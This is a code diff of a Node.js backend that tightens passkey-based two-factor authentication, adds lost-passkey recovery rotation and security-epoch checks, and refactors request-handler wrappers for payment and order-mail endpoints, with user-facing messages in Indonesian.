+    return { ok: false, status: 409, reason: 'lost_passkey_rotation_active_credential_invalid' };
+  }
+
+  const settingsPath = '/rest/v1/security_customer_settings?select=' +
+    encodeURIComponent('id,customer_id,security_epoch') +
+    '&customer_id=eq.' + encodeURIComponent(owner.customerId) +
+    '&limit=2';
+  const settings = await supabaseFetch(settingsPath, { method: 'GET', auth: 'service' });
+  const settingsRows = settings.ok && Array.isArray(settings.data) ? settings.data : [];
+  if (settingsRows.length !== 1 || Number(settingsRows[0].security_epoch || 0) !== securityEpoch) {
+    return { ok: false, status: 409, reason: 'lost_passkey_rotation_epoch_not_committed' };
+  }
+
+  const sessionPath = '/rest/v1/' + LOST_PASSKEY_RECOVERY_SESSION_TABLE
+    + '?select=' + encodeURIComponent('id,request_id,customer_id,auth_user_id,recovery_session_hash,status,used_at,revoked_at,metadata')
+    + '&id=eq.' + encodeURIComponent(recoverySession.id)
+    + '&request_id=eq.' + encodeURIComponent(recoverySession.requestId)
+    + '&customer_id=eq.' + encodeURIComponent(owner.customerId)
+    + '&auth_user_id=eq.' + encodeURIComponent(owner.authUserId)
+    + '&limit=2';
+  const closed = await supabaseFetch(sessionPath, { method: 'GET', auth: 'service' });
+  const closedRows = closed.ok && Array.isArray(closed.data) ? closed.data : [];
+  const closedRow = closedRows.length === 1 ? closedRows[0] : null;
+  const closedMetadata = closedRow && closedRow.metadata && typeof closedRow.metadata === 'object'
+    ? closedRow.metadata
+    : null;
+  if (!closedRow || closedRow.status !== 'used' || !closedRow.used_at || closedRow.revoked_at
+      || !safeEqual(String(closedRow.recovery_session_hash || ''), String(recoverySession.sessionHash || ''))
+      || Number(closedMetadata && closedMetadata.security_epoch || 0) !== securityEpoch
+      || closedMetadata.auth_sessions_revoked !== true
+      || closedMetadata.application_sessions_revoked !== true) {
+    return { ok: false, status: 409, reason: 'lost_passkey_recovery_session_not_atomically_consumed' };
+  }
+
+  const activeSessionsPath = '/rest/v1/security_customer_sessions?select=id'
+    + '&customer_id=eq.' + encodeURIComponent(owner.customerId)
+    + '&status=eq.active&limit=1';
+  const activeSessions = await supabaseFetch(activeSessionsPath, { method: 'GET', auth: 'service' });
+  if (!activeSessions.ok || !Array.isArray(activeSessions.data) || activeSessions.data.length !== 0) {
+    return { ok: false, status: 409, reason: 'lost_passkey_application_sessions_still_active' };
+  }
+
+  const oldPasskeysDeactivated = Math.max(0, Number(
+    v237CommitProofValid
+      ? ((closedMetadata && closedMetadata.old_passkey_count) || 0)
+      : ((completed && completed.old_passkeys_deactivated) || 0)
+  ));
+  return {
+    ok: true,
+    oldPasskeysDeactivated,
+    recoverySessionClosed: true,
+    securityEpoch
+  };
 }
 
 async function diracPasskeyA2FStart(req, res) {
@@ -11750,19 +15644,79 @@ async function diracPasskeyA2FStart(req, res) {
     return res.status(owner.status || 409).json({ ok: false, method: 'passkey', message: owner.message || 'Akun belum siap untuk Passkey.' });
   }
 
+  let body = {};
+  try { body = await readBody(req); } catch (_) { body = {}; }
+  const recoverySessionToken = diracPasskeyA2FLostRecoveryTokenFromBody(body);
+  let lostRecoverySession = null;
+  if (recoverySessionToken) {
+    lostRecoverySession = await diracPasskeyA2FValidateLostRecoverySession(owner, recoverySessionToken);
+    if (!lostRecoverySession.ok) {
+      await diracA2FHardBanCurrentRequest(lostRecoverySession.reason || 'lost_passkey_recovery_session_invalid');
+      return res.status(lostRecoverySession.status || 403).json({
+        ok: false,
+        method: 'passkey',
+        code: 'LOST_PASSKEY_RECOVERY_SESSION_INVALID',
+        message: 'Recovery session tidak valid atau sudah expired. Ulangi verifikasi recovery code.'
+      });
+    }
+  }
+
   const now = Date.now();
   const challenge = crypto.randomBytes(32).toString('base64url');
   const rpId = diracPasskeyA2FRpId(req);
   const origin = requestOrigin(req);
   const userHandle = diracPasskeyA2FUserHandle({ id: owner.customerId, email: owner.email });
-  const activePasskeys = await diracPasskeyA2FListActivePasskeys(owner);
+  let activePasskeys;
+  let securityEpochAtStart;
+  try {
+    activePasskeys = await diracPasskeyA2FListActivePasskeys(owner);
+    securityEpochAtStart = await diracPasskeyA2FReadSecurityEpoch(owner);
+  } catch (_) {
+    return res.status(503).json({
+      ok: false,
+      method: 'passkey',
+      code: 'PASSKEY_STATE_UNAVAILABLE',
+      message: 'Status Passkey tidak dapat dibuktikan. Sistem menolak melanjutkan agar tidak membuka jalur bypass.'
+    });
+  }
   const hasActivePasskey = activePasskeys.length > 0;
-  const mode = hasActivePasskey ? 'authentication' : 'registration';
+  const isLostPasskeyRecoveryRegistration = Boolean(lostRecoverySession && lostRecoverySession.ok);
+  if (!isLostPasskeyRecoveryRegistration && activePasskeys.length > 1) {
+    return res.status(409).json({
+      ok: false,
+      method: 'passkey',
+      code: 'MULTIPLE_ACTIVE_PASSKEYS_BLOCKED',
+      message: 'Ditemukan lebih dari satu Passkey aktif. Gunakan lost Passkey untuk merotasi semuanya menjadi satu credential baru.'
+    });
+  }
+  if (!isLostPasskeyRecoveryRegistration && activePasskeys.length === 0 && securityEpochAtStart === 0) {
+    try {
+      securityEpochAtStart = await diracPasskeyA2FEnsureInitialSecurityEpoch(owner);
+    } catch (_) {
+      return res.status(503).json({
+        ok: false,
+        method: 'passkey',
+        code: 'PASSKEY_INITIAL_SECURITY_EPOCH_BOOTSTRAP_FAILED',
+        message: 'Versi keamanan awal akun tidak dapat dibuktikan. Sistem menolak membuat challenge Passkey.'
+      });
+    }
+  }
+  if (securityEpochAtStart < 1) {
+    return res.status(503).json({ ok: false, method: 'passkey', code: 'PASSKEY_SECURITY_EPOCH_INVALID', message: 'Versi keamanan akun tidak valid. Sistem menolak Passkey.' });
+  }
+  const activeSetAtStart = diracPasskeyA2FActiveSetProof(activePasskeys);
+  const mode = isLostPasskeyRecoveryRegistration ? 'registration' : (hasActivePasskey ? 'authentication' : 'registration');
+  const rotationPurpose = isLostPasskeyRecoveryRegistration
+    ? DIRAC_PASSKEY_ROTATION_PURPOSE_RECOVERY_V237
+    : hasActivePasskey
+      ? DIRAC_PASSKEY_ROTATION_PURPOSE_REPLACE_V237
+      : DIRAC_PASSKEY_ROTATION_PURPOSE_INITIAL_V237;
   const jti = crypto.randomBytes(32).toString('base64url');
   const payload = {
     type: DIRAC_PASSKEY_A2F_TOKEN_TYPE,
     method: 'passkey',
     mode,
+    rotationPurpose,
     jti,
     challenge,
     rpId,
@@ -11771,6 +15725,14 @@ async function diracPasskeyA2FStart(req, res) {
     customerId: owner.customerId,
     emailHash: customerMfaProfileId(owner.email),
     uaHash: customerMfaBindingHash('ua', requestUserAgent(req)),
+    securityEpochAtStart,
+    activeCredentialCountAtStart: activeSetAtStart.count,
+    activeCredentialSetHashAtStart: activeSetAtStart.hash,
+    lostPasskeyRecovery: isLostPasskeyRecoveryRegistration ? {
+      requestId: lostRecoverySession.requestId,
+      sessionId: lostRecoverySession.id,
+      sessionHash: lostRecoverySession.sessionHash
+    } : undefined,
     issuedAtMs: now,
     expiresAtMs: now + DIRAC_PASSKEY_A2F_TTL_MS
   };
@@ -11784,12 +15746,14 @@ async function diracPasskeyA2FStart(req, res) {
     userVerification: 'required'
   };
 
-  if (hasActivePasskey) {
+  if (hasActivePasskey && !isLostPasskeyRecoveryRegistration) {
     return res.status(200).json({
       ok: true,
       method: 'passkey',
       passkeyMode: 'authentication',
       needsRegistration: false,
+      device_binding_required: true,
+      device_binding_policy: 'webcrypto-nonextractable-v1',
       setupToken,
       mfaSetupToken: setupToken,
       expires_in: Math.floor(DIRAC_PASSKEY_A2F_TTL_MS / 1000),
@@ -11812,6 +15776,8 @@ async function diracPasskeyA2FStart(req, res) {
     method: 'passkey',
     passkeyMode: 'registration',
     needsRegistration: true,
+    device_binding_required: true,
+    device_binding_policy: 'webcrypto-nonextractable-v1',
     setupToken,
     mfaSetupToken: setupToken,
     expires_in: Math.floor(DIRAC_PASSKEY_A2F_TTL_MS / 1000),
@@ -11831,9 +15797,19 @@ async function diracPasskeyA2FStart(req, res) {
         requireResidentKey: false,
         userVerification: 'required'
       },
-      extensions: { credProps: true }
+      extensions: { credProps: true },
+      excludeCredentials: activePasskeys
+        .filter((row) => row && row.credential_id)
+        .map((row) => ({
+          type: 'public-key',
+          id: String(row.credential_id),
+          transports: Array.isArray(row.transports) ? row.transports : []
+        }))
     },
-    message: 'Browser akan membuka Face ID, sidik jari, atau PIN untuk membuat Passkey.'
+    recovery_replacement: isLostPasskeyRecoveryRegistration,
+    message: isLostPasskeyRecoveryRegistration
+      ? 'Recovery valid. Browser akan membuka Face ID, sidik jari, atau PIN untuk membuat Passkey pengganti.'
+      : 'Browser akan membuka Face ID, sidik jari, atau PIN untuk membuat Passkey.'
   });
 }
 
@@ -11873,6 +15849,24 @@ async function diracPasskeyA2FVerify(req, res) {
     await diracA2FHardBanCurrentRequest('passkey_a2f_customer_mismatch');
     return res.status(403).json({ ok: false, method: 'passkey', message: 'Customer owner Passkey tidak cocok. Login ulang dulu.' });
   }
+  if (!payload.authUserId || !safeEqual(String(payload.authUserId), String(owner.authUserId || ''))) {
+    await diracA2FHardBanCurrentRequest('passkey_a2f_auth_user_mismatch');
+    return res.status(403).json({ ok: false, method: 'passkey', message: 'User autentikasi Passkey tidak cocok. Login ulang dulu.' });
+  }
+
+  let lostRecoverySession = null;
+  if (payload.lostPasskeyRecovery) {
+    lostRecoverySession = await diracPasskeyA2FValidateLostRecoverySessionPayload(owner, payload);
+    if (!lostRecoverySession.ok) {
+      await diracA2FHardBanCurrentRequest(lostRecoverySession.reason || 'lost_passkey_recovery_session_invalid_at_verify');
+      return res.status(lostRecoverySession.status || 403).json({
+        ok: false,
+        method: 'passkey',
+        code: 'LOST_PASSKEY_RECOVERY_SESSION_INVALID',
+        message: 'Recovery session tidak valid atau sudah expired. Ulangi verifikasi recovery code.'
+      });
+    }
+  }
   if (payload.uaHash) {
     const expectedUaHash = customerMfaBindingHash('ua', requestUserAgent(req));
     if (!expectedUaHash || !safeEqual(String(payload.uaHash), expectedUaHash)) {
@@ -11899,10 +15893,12 @@ async function diracPasskeyA2FVerify(req, res) {
   const clientType = String(clientData.type || '').toLowerCase();
   const payloadMode = String(payload.mode || body.passkeyMode || '').toLowerCase();
   const isAuthentication = payloadMode === 'authentication';
-  if (isAuthentication && clientType !== 'webauthn.get') {
-    return res.status(400).json({ ok: false, method: 'passkey', message: 'Respons browser bukan login Passkey yang valid.' });
+  const isPendingConfirmation = payloadMode === 'confirm_pending';
+  const isAssertion = isAuthentication || isPendingConfirmation;
+  if (isAssertion && clientType !== 'webauthn.get') {
+    return res.status(400).json({ ok: false, method: 'passkey', message: 'Respons browser bukan assertion Passkey yang valid.' });
   }
-  if (!isAuthentication && clientType !== 'webauthn.create') {
+  if (!isAssertion && clientType !== 'webauthn.create') {
     return res.status(400).json({ ok: false, method: 'passkey', message: 'Respons browser bukan pendaftaran Passkey yang valid.' });
   }
   const clientOrigin = normalizeDashboardMfaOrigin(clientData.origin || '');
@@ -11911,11 +15907,11 @@ async function diracPasskeyA2FVerify(req, res) {
     await diracA2FHardBanCurrentRequest('passkey_a2f_origin_mismatch');
     return res.status(403).json({ ok: false, method: 'passkey', message: 'Origin Passkey tidak cocok dengan domain login.' });
   }
-  if (!isAuthentication && !response.attestationObject) {
+  if (!isAssertion && !response.attestationObject) {
     return res.status(400).json({ ok: false, method: 'passkey', message: 'Browser tidak mengirim attestation Passkey. Coba ulangi.' });
   }
-  if (isAuthentication && (!response.authenticatorData || !response.signature)) {
-    return res.status(400).json({ ok: false, method: 'passkey', message: 'Browser tidak mengirim bukti login Passkey. Coba ulangi.' });
+  if (isAssertion && (!response.authenticatorData || !response.signature)) {
+    return res.status(400).json({ ok: false, method: 'passkey', message: 'Browser tidak mengirim bukti assertion Passkey. Coba ulangi.' });
   }
 
   const credentialId = diracPasskeyA2FCredentialId(credential);
@@ -11923,33 +15919,215 @@ async function diracPasskeyA2FVerify(req, res) {
     return res.status(400).json({ ok: false, method: 'passkey', message: 'Credential Passkey kosong. Coba ulangi.' });
   }
 
+  let activeBeforeVerify;
+  let securityEpochBeforeVerify;
+  try {
+    activeBeforeVerify = await diracPasskeyA2FListActivePasskeys(owner);
+    securityEpochBeforeVerify = await diracPasskeyA2FReadSecurityEpoch(owner);
+  } catch (_) {
+    return res.status(503).json({ ok: false, method: 'passkey', code: 'PASSKEY_STATE_UNAVAILABLE', message: 'Status Passkey berubah atau tidak dapat dibuktikan. Sistem menolak verifikasi.' });
+  }
+  const activeSetBeforeVerify = diracPasskeyA2FActiveSetProof(activeBeforeVerify);
+  const expectedSetHash = String(payload.activeCredentialSetHashAtStart || '');
+  const expectedSetCount = Number(payload.activeCredentialCountAtStart);
+  const expectedEpoch = Number(payload.securityEpochAtStart);
+  if (!/^[a-f0-9]{64}$/.test(expectedSetHash)
+      || !Number.isSafeInteger(expectedSetCount) || expectedSetCount < 0
+      || !Number.isSafeInteger(expectedEpoch) || expectedEpoch < 0
+      || activeSetBeforeVerify.count !== expectedSetCount
+      || !safeEqual(activeSetBeforeVerify.hash, expectedSetHash)
+      || securityEpochBeforeVerify !== expectedEpoch) {
+    return res.status(409).json({ ok: false, method: 'passkey', code: 'PASSKEY_STATE_CHANGED', message: 'Status Passkey berubah sejak challenge dibuat. Mulai ulang proses Passkey.' });
+  }
+
   let dbWrite = null;
   let registeredNow = false;
-  if (isAuthentication) {
-    const existingResult = await diracPasskeyA2FFetchByCredentialId(credentialId);
-    const row = existingResult.ok && Array.isArray(existingResult.data) ? existingResult.data[0] : null;
+  if (isPendingConfirmation) {
+    const pendingCredentialId = String(payload.pendingCredentialId || '');
+    const pendingPasskeyId = String(payload.pendingPasskeyId || '');
+    const pendingRotationId = String(payload.rotationId || '');
+    if (!safeEqual(credentialId, pendingCredentialId)
+        || !customerSecurityLooksLikeUuid(pendingPasskeyId)
+        || !customerSecurityLooksLikeUuid(pendingRotationId)) {
+      await diracA2FHardBanCurrentRequest('passkey_confirm_pending_credential_binding_invalid');
+      return res.status(403).json({ ok: false, method: 'passkey', code: 'PASSKEY_CONFIRM_PENDING_BINDING_INVALID', message: 'Credential konfirmasi tidak cocok dengan Passkey pending.' });
+    }
+    const pendingReadback = await diracPasskeyA2FFetchCredentialStateV237({
+      owner,
+      credentialId: pendingCredentialId,
+      rotationId: pendingRotationId,
+      passkeyId: pendingPasskeyId
+    });
+    const pendingRows = pendingReadback.ok && Array.isArray(pendingReadback.data) ? pendingReadback.data : [];
+    const pendingRow = pendingRows.length === 1 ? pendingRows[0] : null;
+    if (!pendingRow) {
+      return res.status(409).json({ ok: false, method: 'passkey', code: 'PASSKEY_CONFIRM_PENDING_NOT_FOUND', message: 'Passkey pending tidak ditemukan atau sudah berubah.' });
+    }
+    dbWrite = await diracPasskeyA2FConfirmPendingRegistrationV237({
+      row: pendingRow,
+      owner,
+      response,
+      credential,
+      clientData,
+      payload,
+      req,
+      body,
+      setupToken
+    });
+    registeredNow = Boolean(dbWrite && dbWrite.ok && dbWrite.created);
+  } else if (isAuthentication) {
+    if (activeBeforeVerify.length !== 1) {
+      return res.status(409).json({ ok: false, method: 'passkey', code: 'ACTIVE_PASSKEY_CARDINALITY_INVALID', message: 'Autentikasi hanya diizinkan jika tepat satu Passkey aktif.' });
+    }
+    const row = activeBeforeVerify.find((item) => item && safeEqual(String(item.credential_id || ''), credentialId));
     if (!row || row.is_active !== true || !diracPasskeyA2FOwnerMatches(row, owner)) {
       await diracA2FHardBanCurrentRequest('passkey_a2f_credential_owner_mismatch');
-      return res.status(403).json({ ok: false, method: 'passkey', message: 'Passkey tidak terdaftar untuk akun ini. Buat Passkey dulu dari akun yang benar.' });
+      return res.status(403).json({ ok: false, method: 'passkey', message: 'Passkey tidak terdaftar atau sudah dicabut untuk akun ini.' });
     }
-    dbWrite = await diracPasskeyA2FUpdateUsage({ row, owner, response, credential, clientData, payload, req });
+    dbWrite = await diracPasskeyA2FUpdateUsage({ row, owner, response, credential, clientData, payload, req, body, setupToken });
   } else {
-    dbWrite = await diracPasskeyA2FSaveRegistration({ owner, credential, response, clientData, payload, req });
-    registeredNow = Boolean(dbWrite && dbWrite.ok && dbWrite.created);
+    if (payload.lostPasskeyRecovery) {
+      if (activeBeforeVerify.length < 1
+          || activeBeforeVerify.some((item) => item && safeEqual(String(item.credential_id || ''), credentialId))) {
+        return res.status(409).json({ ok: false, method: 'passkey', code: 'LOST_PASSKEY_REPLACEMENT_NOT_NEW', message: 'Passkey pengganti wajib memakai credential baru yang berbeda dari seluruh Passkey lama.' });
+      }
+    } else if (activeBeforeVerify.length !== 0) {
+      return res.status(409).json({ ok: false, method: 'passkey', code: 'PASSKEY_REGISTRATION_STATE_CHANGED', message: 'Passkey aktif sudah ada. Pendaftaran baru tanpa recovery ditolak.' });
+    }
+    dbWrite = await diracPasskeyA2FSaveRegistration({ owner, credential, response, clientData, payload, req, body, setupToken });
   }
 
   if (!dbWrite || !dbWrite.ok) {
     return res.status(dbWrite && dbWrite.status ? dbWrite.status : 500).json({
       ok: false,
       method: 'passkey',
+      code: dbWrite && dbWrite.code ? String(dbWrite.code) : 'PASSKEY_DATABASE_WRITE_FAILED',
       message: diracPasskeyA2FPublicError(dbWrite && dbWrite.message ? dbWrite.message : 'Passkey belum tersimpan ke database.')
     });
   }
+  if (dbWrite.confirmationRequired === true && dbWrite.confirmationResponse) {
+    return res.status(202).json(dbWrite.confirmationResponse);
+  }
 
-  await diracPasskeyA2FMarkSettingsActive(owner);
+  let lostRecoveryRotation = null;
+  if (!isAuthentication && lostRecoverySession && lostRecoverySession.ok) {
+    lostRecoveryRotation = await diracPasskeyA2FCompleteLostRecoveryRotation({
+      owner,
+      newCredentialId: credentialId,
+      recoverySession: lostRecoverySession,
+      req,
+      savedPasskeyRow: dbWrite.row
+    });
+    if (!lostRecoveryRotation.ok) {
+      return res.status(lostRecoveryRotation.status || 500).json({
+        ok: false,
+        method: 'passkey',
+        code: 'LOST_PASSKEY_ROTATION_INCOMPLETE',
+        message: 'Passkey baru tersimpan, tetapi passkey lama belum berhasil dinonaktifkan. Ulangi proses daftar Passkey baru dari halaman recovery.'
+      });
+    }
+  }
 
-  const proof = customerSecurityCreateDashboardMfaToken(req, user, 'passkey');
-  customerSecuritySetDashboardMfaCookie(res, proof);
+  const settingsActivation = await diracPasskeyA2FMarkSettingsActive(owner);
+  const securityEpoch = Number(
+    lostRecoveryRotation && lostRecoveryRotation.ok
+      ? lostRecoveryRotation.securityEpoch
+      : settingsActivation && settingsActivation.securityEpoch
+  );
+  if (!settingsActivation || settingsActivation.ok !== true
+      || !Number.isSafeInteger(securityEpoch) || securityEpoch < 1
+      || (isAuthentication && securityEpoch !== Number(payload.securityEpochAtStart))
+      || (isPendingConfirmation && securityEpoch !== Number(dbWrite && dbWrite.securityEpoch))
+      || (lostRecoveryRotation && lostRecoveryRotation.ok
+        && (Number(settingsActivation.securityEpoch) !== securityEpoch
+          || securityEpoch <= Number(payload.securityEpochAtStart)))) {
+    clearCurrentRequestSessionCookiesV235(req, res);
+    return res.status(503).json({
+      ok: false,
+      method: 'passkey',
+      code: 'PASSKEY_SECURITY_EPOCH_UNAVAILABLE',
+      message: 'Passkey berhasil diverifikasi, tetapi versi keamanan akun belum dapat dipastikan. Silakan login ulang.'
+    });
+  }
+
+  let finalActivePasskeys;
+  let finalSecurityEpoch;
+  try {
+    finalActivePasskeys = await diracPasskeyA2FListActivePasskeys(owner, true);
+    finalSecurityEpoch = await diracPasskeyA2FReadSecurityEpoch(owner);
+  } catch (_) {
+    clearCurrentRequestSessionCookiesV235(req, res);
+    return res.status(503).json({ ok: false, method: 'passkey', code: 'PASSKEY_FINAL_STATE_UNAVAILABLE', message: 'Status akhir Passkey tidak dapat dibuktikan. Sesi tidak diterbitkan.' });
+  }
+  const finalDeviceBinding = finalActivePasskeys.length === 1
+    ? diracPasskeyA2FStoredDeviceBinding(finalActivePasskeys[0])
+    : { ok: false };
+  if (finalSecurityEpoch !== securityEpoch
+      || finalActivePasskeys.length !== 1
+      || !finalActivePasskeys[0]
+      || !safeEqual(String(finalActivePasskeys[0].credential_id || ''), credentialId)
+      || finalActivePasskeys[0].is_active !== true
+      || !dbWrite.deviceBindingVerified
+      || !finalDeviceBinding.ok
+      || !safeEqual(String(finalDeviceBinding.keyId || ''), String(dbWrite.deviceBindingKeyId || ''))) {
+    clearCurrentRequestSessionCookiesV235(req, res);
+    return res.status(409).json({ ok: false, method: 'passkey', code: 'PASSKEY_FINAL_STATE_INVALID', message: 'Passkey berubah sebelum sesi diterbitkan. Login ditolak.' });
+  }
+
+  const issuancePermit = customerSecurityCreatePasskeySessionIssuancePermitV235(
+    req,
+    owner.customerId,
+    securityEpoch,
+    credentialId
+  );
+  const issuedSession = issuancePermit
+    ? await customerSecurityTouchCurrentSession(req, owner.customerId, null, issuancePermit).catch(() => null)
+    : null;
+  if (!issuedSession || issuedSession.ok !== true || !issuedSession.session_id
+      || Number(issuedSession.security_epoch || 0) !== securityEpoch) {
+    clearCurrentRequestSessionCookiesV235(req, res);
+    return res.status(503).json({
+      ok: false,
+      method: 'passkey',
+      code: 'PASSKEY_PROTECTED_SESSION_ISSUANCE_FAILED',
+      message: 'Passkey berhasil diverifikasi, tetapi sesi perangkat baru belum dapat diterbitkan dengan aman. Silakan login ulang.'
+    });
+  }
+
+  const proof = customerSecurityCreateDashboardMfaToken(req, user, 'passkey', res, {
+    customerId: owner.customerId,
+    securityEpoch
+  });
+  if (!proof || !proof.token) {
+    await customerSecurityRevokeIssuedSessionV235(
+      req,
+      owner.customerId,
+      issuedSession.session_id,
+      'mfa_binding_publication_failed'
+    );
+    clearCurrentRequestSessionCookiesV235(req, res);
+    return res.status(503).json({
+      ok: false,
+      method: 'passkey',
+      code: proof && proof.error || 'MFA_STABLE_SESSION_BINDING_UNAVAILABLE',
+      message: 'Passkey berhasil diverifikasi, tetapi binding sesi MFA belum dapat dibentuk secara aman. Silakan login ulang lalu verifikasi Passkey kembali.'
+    });
+  }
+  if (!customerSecuritySetDashboardMfaCookie(res, proof)) {
+    await customerSecurityRevokeIssuedSessionV235(
+      req,
+      owner.customerId,
+      issuedSession.session_id,
+      'mfa_cookie_publication_failed'
+    );
+    clearCurrentRequestSessionCookiesV235(req, res);
+    return res.status(503).json({
+      ok: false,
+      method: 'passkey',
+      code: 'MFA_COOKIE_ATOMIC_PUBLICATION_FAILED',
+      message: 'Passkey berhasil diverifikasi, tetapi cookie MFA tidak dapat diterbitkan secara atomik. Silakan login ulang lalu verifikasi Passkey kembali.'
+    });
+  }
 
   return res.status(200).json({
     ok: true,
@@ -11961,6 +16139,18 @@ async function diracPasskeyA2FVerify(req, res) {
     needsRegistration: false,
     database_saved: true,
     registered_now: registeredNow,
+    credential_policy: 'synced-passkey-device-binding-required-v1',
+    synced_passkeys_allowed: true,
+    device_bound: true,
+    device_binding_verified: true,
+    device_binding_policy: 'webcrypto-nonextractable-v1',
+    webauthn_backup_eligible: Boolean(finalActivePasskeys[0]
+      && finalActivePasskeys[0].credential_json
+      && finalActivePasskeys[0].credential_json.webauthn
+      && finalActivePasskeys[0].credential_json.webauthn.backup_eligible === true),
+    device_binding_key_hint: String(finalDeviceBinding.keyId || '').slice(0, 12),
+    lost_passkey_recovery_replacement: Boolean(lostRecoveryRotation && lostRecoveryRotation.ok),
+    old_passkeys_deactivated: lostRecoveryRotation && lostRecoveryRotation.ok ? lostRecoveryRotation.oldPasskeysDeactivated : 0,
     owner_bound: true,
     owner_source: owner.source,
     credential_id_hint: crypto.createHash('sha256').update(String(credentialId)).digest('hex').slice(0, 12),
@@ -11972,6 +16162,7 @@ async function diracPasskeyA2FVerify(req, res) {
       expiresAtMs: proof.expiresAtMs,
       activeAtMs: proof.activeAtMs,
       method: 'passkey',
+      securityEpoch,
       transport: 'httponly-secure-cookie-only'
     },
     time: diracNowIso()
@@ -11988,7 +16179,7 @@ async function diracPasskeyA2FVerify(req, res) {
    - Lets UI unlock Email backup only when domain_passkeys has active row.
    ============================================================ */
 
-const __diracPasskeyDbStatusPreviousHandler = module.exports;
+const __diracPasskeyDbStatusPreviousHandler = __diracV202DispatcherSentinel;
 const DIRAC_PASSKEY_DB_STATUS_ACTIONS = new Set([
   'dirac_mfa_passkey_status',
   'domain_mfa_passkey_status',
@@ -11996,10 +16187,10 @@ const DIRAC_PASSKEY_DB_STATUS_ACTIONS = new Set([
   'domain_passkey_status'
 ]);
 
-module.exports = async function diracPasskeyDbStatusWrapper(req, res) {
+__diracV202RegisterMiddleware(async function diracPasskeyDbStatusWrapper(req, res, nextHandlerV202) {
   const rawAction = String((req.query && req.query.action) || '').trim();
   if (!DIRAC_PASSKEY_DB_STATUS_ACTIONS.has(rawAction)) {
-    return __diracPasskeyDbStatusPreviousHandler(req, res);
+    return nextHandlerV202(req, res);
   }
 
   const cors = setCors(req, res, { isDomainAction: true });
@@ -12023,7 +16214,10 @@ module.exports = async function diracPasskeyDbStatusWrapper(req, res) {
       + '&is_active=eq.true&email=eq.' + encodeURIComponent(email)
       + '&order=created_at.desc&limit=20';
     const directResult = await supabaseFetch(directPath, { method: 'GET', auth: 'service' }).catch(() => null);
-    const directRows = directResult && directResult.ok && Array.isArray(directResult.data) ? directResult.data : [];
+    if (!directResult || directResult.ok !== true || !Array.isArray(directResult.data)) {
+      return res.status(503).json({ ok: false, active: false, method: 'passkey', code: 'PASSKEY_STATUS_READ_FAILED', message: 'Status Passkey tidak dapat dibuktikan. Sistem menolak fallback.' });
+    }
+    const directRows = directResult.data;
     if (directRows.length > 0) {
       return res.status(200).json({
         ok: true,
@@ -12080,7 +16274,7 @@ module.exports = async function diracPasskeyDbStatusWrapper(req, res) {
       message: 'Status Passkey belum bisa dicek. Coba login ulang lalu ulangi.'
     });
   }
-};
+}, "diracPasskeyDbStatusWrapper");
 
 /* ============================================================
    UNIVERSAL PAYMENT GATEWAY FOR PESANAN.HTML - APPEND ONLY
@@ -12092,15 +16286,15 @@ module.exports = async function diracPasskeyDbStatusWrapper(req, res) {
    - No invoice/localStorage source is trusted.
    ============================================================ */
 
-const __diracUniversalPesananPaymentPreviousHandler = module.exports;
+const __diracUniversalPesananPaymentPreviousHandler = __diracV202DispatcherSentinel;
 const DIRAC_UNIVERSAL_PESANAN_PAYMENT_ACTIONS = new Set(['create_payment', 'my_orders']);
 
-module.exports = async function diracUniversalPesananPaymentWrapper(req, res) {
+__diracV202RegisterMiddleware(async function diracUniversalPesananPaymentWrapper(req, res, nextHandlerV202) {
   const rawAction = String((req.query && req.query.action) || '').trim();
   const action = diracUniversalPesananPaymentNormalizeAction(rawAction);
 
   if (!DIRAC_UNIVERSAL_PESANAN_PAYMENT_ACTIONS.has(action)) {
-    return __diracUniversalPesananPaymentPreviousHandler(req, res);
+    return nextHandlerV202(req, res);
   }
 
   const cors = setCors(req, res, { isDomainAction: true });
@@ -12126,8 +16320,8 @@ module.exports = async function diracUniversalPesananPaymentWrapper(req, res) {
     });
   }
 
-  return __diracUniversalPesananPaymentPreviousHandler(req, res);
-};
+  return nextHandlerV202(req, res);
+}, "diracUniversalPesananPaymentWrapper");
 
 function diracUniversalPesananPaymentNormalizeAction(action) {
   const clean = String(action || '').trim().toLowerCase().replace(/[\s-]+/g, '_');
@@ -12462,6 +16656,7 @@ async function diracUniversalPesananCreatePayment(req, res) {
     gatewayName,
     gatewayReference,
     transactionId: transaction.id,
+    customerId,
     orderId: paymentInput.orderRefId,
     domainOrderId: paymentInput.domainOrderId || undefined,
     orderCode: paymentInput.orderCode,
@@ -12729,7 +16924,7 @@ async function diracUniversalPesananFetchRegularItems(orderId, amount, serviceTy
 async function diracUniversalPesananFetchProductsForOrderItems(rows) {
   const ids = Array.from(new Set((rows || [])
     .map((row) => lockedPaymentCleanText(row && row.product_doc_id || '', 120))
-    .filter(Boolean))).slice(0, 30);
+    .filter(Boolean)));
   const productsById = new Map();
   for (const id of ids) {
     const result = await supabaseFetch(
@@ -12854,12 +17049,12 @@ async function diracUniversalPesananFindReusableTransaction(input) {
    ============================================================ */
 
 const DIRAC_ORDER_MAIL_PATCH = 'order-mail-v23-wib-display-datefix-email-only';
-const __diracOrderMailPreviousHandler = module.exports;
+const __diracOrderMailPreviousHandler = __diracV202DispatcherSentinel;
 
-module.exports = async function diracOrderMailWrapper(req, res) {
+__diracV202RegisterMiddleware(async function diracOrderMailWrapper(req, res, nextHandlerV202) {
   const rawAction = String((req.query && req.query.action) || '').trim().toLowerCase().replace(/[\s-]+/g, '_');
   if (rawAction !== 'order_mail_health' && rawAction !== 'order_email_health') {
-    return __diracOrderMailPreviousHandler(req, res);
+    return nextHandlerV202(req, res);
   }
 
   const cors = setCors(req, res, { isDomainAction: true });
@@ -12877,7 +17072,7 @@ module.exports = async function diracOrderMailWrapper(req, res) {
     adminPanelEnvNamesIgnored: ['SMTP_HOST', 'SMTP_PORT', 'SMTP_SECURE', 'SMTP_USER', 'SMTP_PASS'],
     note: 'Endpoint ini hanya mengecek ENV ORDER_CUSTOMER_* dan ORDER_OWNER_*. Secret/app password tidak ditampilkan.'
   });
-};
+}, "diracOrderMailWrapper");
 
 
 function orderMailPendingPaymentSkipSummary(source) {
@@ -13219,7 +17414,7 @@ function orderMailNormalizeOrderInput(input) {
       provider: orderMailCleanText(payment.provider || payment.payment_provider || '', 60),
       invoice_id: orderMailCleanText(payment.invoice_id || payment.id || '', 120)
     },
-    items: items.slice(0, 30).map((item, index) => ({
+    items: items.map((item, index) => ({
       title: orderMailCleanText(item && (item.title || item.product_title || item.name || item.domain_name) || `Item ${index + 1}`, 180),
       quantity: orderMailPositiveInt(item && (item.quantity || item.qty || item.years) || 1, 1, 9999),
       unit_price: orderMailMoney(item && (item.unit_price ?? item.price ?? item.register_price ?? 0)),
